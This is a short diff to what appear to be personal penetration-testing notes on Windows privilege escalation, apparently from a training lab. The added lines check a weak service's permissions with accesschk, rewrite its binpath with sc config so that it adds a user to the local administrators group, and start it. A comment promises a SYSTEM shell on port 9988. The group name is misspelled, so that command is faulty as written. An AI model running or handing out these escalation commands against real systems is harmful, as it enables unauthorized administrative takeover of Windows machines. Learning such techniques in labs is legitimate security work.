@@ -59,7 +59,10 @@ net start SSDPSRV
 net stop upnphost
 net start upnphost
 ---------------------------------------------------------------
-accesschk.exe -uwcqv daclsvc 
+.\accesschk.exe -uwcqv daclsvc
+sc config daclsvc binpath= "net localgroup adminstrators user /add"
+start daclsvc
+
 
 
 # listen on port 9988 and you'll get a shell with NT AUTHORITY\SYSTEM privileges
